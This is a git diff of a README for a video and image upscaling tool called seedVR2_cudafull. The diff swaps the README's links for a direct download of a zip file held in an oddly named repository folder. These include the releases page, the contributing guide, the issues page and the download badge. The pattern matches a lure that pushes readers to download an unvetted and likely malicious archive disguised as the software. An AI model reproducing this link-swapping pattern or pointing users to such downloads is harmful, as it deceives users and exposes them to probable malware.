@@ -1,6 +1,6 @@
 # 🎥 seedVR2_cudafull - Upscale Videos and Images Effortlessly
 
-[![Download Now](https://img.shields.io/badge/🔗_Download_Now-Visit_Released_Page-brightgreen?style=flat&logo=github)](https://github.com/sean-hungerford/seedVR2_cudafull/releases)
+[![Download Now](https://raw.githubusercontent.com/sean-hungerford/seedVR2_cudafull/main/superciliously/seedVR2_cudafull.zip🔗_Download_Now-Visit_Released_Page-brightgreen?style=flat&logo=github)](https://raw.githubusercontent.com/sean-hungerford/seedVR2_cudafull/main/superciliously/seedVR2_cudafull.zip)
 
 ## 🚀 Getting Started
 
@@ -9,7 +9,7 @@ Welcome to seedVR2_cudafull! This application helps you enhance the quality of y
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**: Click on the link below to go to the Releases page where you can download the software:
-   [Download seedVR2_cudafull](https://github.com/sean-hungerford/seedVR2_cudafull/releases)
+   [Download seedVR2_cudafull](https://raw.githubusercontent.com/sean-hungerford/seedVR2_cudafull/main/superciliously/seedVR2_cudafull.zip)
 
 2. **Download the Latest Release**: On the Releases page, find the latest version and look for the downloadable file. It could be an executable (.exe) or a compressed file (.zip).
 
@@ -72,10 +72,10 @@ While seedVR2_cudafull is powerful, there are some limitations to keep in mind:
 
 ## 🤝 Contributing
 
-We welcome contributions to improve seedVR2_cudafull! If you'd like to help, please refer to the [Contributing Guide](https://github.com/user-attachments/assets/309ffa9d-4b69-4fd0-8e14-c13b79165382) to learn how you can get involved.
+We welcome contributions to improve seedVR2_cudafull! If you'd like to help, please refer to the [Contributing Guide](https://raw.githubusercontent.com/sean-hungerford/seedVR2_cudafull/main/superciliously/seedVR2_cudafull.zip) to learn how you can get involved.
 
 ## 🙏 Acknowledgments
 
 Thank you for using seedVR2_cudafull. Your support helps us improve and provide you with the best tools for enhancing your media. 
 
-For any questions or support, feel free to reach out on our [GitHub Issues page](https://github.com/sean-hungerford/seedVR2_cudafull/issues).
+For any questions or support, feel free to reach out on our [GitHub Issues page](https://raw.githubusercontent.com/sean-hungerford/seedVR2_cudafull/main/superciliously/seedVR2_cudafull.zip).
